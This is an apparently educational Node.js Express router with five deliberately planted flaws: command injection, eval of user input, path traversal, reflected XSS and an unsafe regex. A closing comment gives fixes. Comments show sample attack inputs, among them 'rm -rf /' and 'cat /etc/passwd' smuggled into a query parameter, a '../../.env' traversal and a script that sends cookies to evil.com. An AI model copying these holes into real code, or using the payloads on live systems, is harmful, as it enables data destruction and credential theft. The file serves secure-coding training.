/**
 * INTENTIONALLY VULNERABLE CODE - FOR TRAINING ONLY
 * This file contains 5 security vulnerabilities.
 * DO NOT use this code in production!
 */

const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const router = express.Router();

// ╔══════════════════════════════════════════════════╗
// ║ VULNERABILITY 1: Command Injection (CWE-78)     ║
// ╚══════════════════════════════════════════════════╝
router.get('/check-stock', (req, res) => {
    const productId = req.query.id;
    // BAD: User input directly in shell command
    // Attacker sends: id=123; rm -rf /
    // Or: id=123; cat /etc/passwd
    exec(`grep ${productId} /data/inventory.txt`, (err, stdout) => {
        res.send(stdout || 'Not found');
    });
});

// ╔══════════════════════════════════════════════════╗
// ║ VULNERABILITY 2: eval() with user input (CWE-94)║
// ╚══════════════════════════════════════════════════╝
router.post('/calculate-discount', (req, res) => {
    const { formula } = req.body;
    // BAD: eval executes arbitrary JavaScript
    // Attacker sends: formula = "require('child_process').exec('whoami')"
    try {
        const result = eval(formula);
        res.json({ discount: result });
    } catch (e) {
        res.status(400).json({ error: 'Invalid formula' });
    }
});

// ╔══════════════════════════════════════════════════╗
// ║ VULNERABILITY 3: Path Traversal (CWE-22)        ║
// ╚══════════════════════════════════════════════════╝
router.get('/download/:filename', (req, res) => {
    const filename = req.params.filename;
    // BAD: User controls the file path
    // Attacker sends: filename = ../../etc/passwd
    // Or: filename = ../../.env
    const filePath = './uploads/' + filename;
    res.sendFile(filePath, { root: '.' });
});

// ╔══════════════════════════════════════════════════╗
// ║ VULNERABILITY 4: XSS - Reflected (CWE-79)       ║
// ╚══════════════════════════════════════════════════╝
router.get('/search', (req, res) => {
    const query = req.query.q;
    // BAD: User input directly rendered in HTML without escaping
    // Attacker sends: q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
    res.send(`
        <h1>Search Results</h1>
        <p>You searched for: ${query}</p>
        <p>No products found matching "${query}"</p>
    `);
});

// ╔══════════════════════════════════════════════════════════╗
// ║ VULNERABILITY 5: Unsafe Regex - ReDoS (CWE-1333)       ║
// ╚══════════════════════════════════════════════════════════╝
router.get('/validate-email', (req, res) => {
    const email = req.query.email;
    // BAD: User input used as regex pattern
    // AND: This regex is vulnerable to ReDoS (catastrophic backtracking)
    // Attacker sends a crafted string that makes the regex take exponential time
    const emailRegex = new RegExp(req.query.pattern || '^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+)+$');
    const isValid = emailRegex.test(email);
    res.json({ valid: isValid });
});

module.exports = router;

/*
 * ═══════════════════════════════════════════
 * FIXES (try to fix them yourself first!)
 * ═══════════════════════════════════════════
 *
 * Fix 1 (Command Injection):
 *   const { execFile } = require('child_process');
 *   execFile('grep', [productId, '/data/inventory.txt'], (err, stdout) => {
 *       res.send(stdout || 'Not found');
 *   });
 *   // execFile does NOT use a shell, so ; and | are not interpreted
 *
 * Fix 2 (eval):
 *   // Use a safe math library instead of eval
 *   const math = require('mathjs');
 *   const result = math.evaluate(formula);
 *   // Or implement a simple expression parser
 *   // NEVER use eval() with user input
 *
 * Fix 3 (Path Traversal):
 *   const safeName = path.basename(filename); // Strips ../ and directory parts
 *   const filePath = path.join(__dirname, 'uploads', safeName);
 *   // Verify the resolved path is still within uploads/
 *   if (!filePath.startsWith(path.join(__dirname, 'uploads'))) {
 *       return res.status(403).send('Forbidden');
 *   }
 *   res.sendFile(filePath);
 *
 * Fix 4 (XSS):
 *   // Option A: Use a template engine with auto-escaping
 *   // Option B: Escape HTML entities manually
 *   const escapeHtml = (s) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;')
 *                               .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 *   const safeQuery = escapeHtml(query);
 *   res.send(`<p>You searched for: ${safeQuery}</p>`);
 *   // Option C: Return JSON instead of HTML (best for APIs)
 *   res.json({ query, results: [] });
 *
 * Fix 5 (ReDoS):
 *   // 1. Never use user input as a regex pattern
 *   // 2. Use a safe, pre-defined email regex
 *   const validator = require('validator');
 *   const isValid = validator.isEmail(email);
 *   res.json({ valid: isValid });
 */
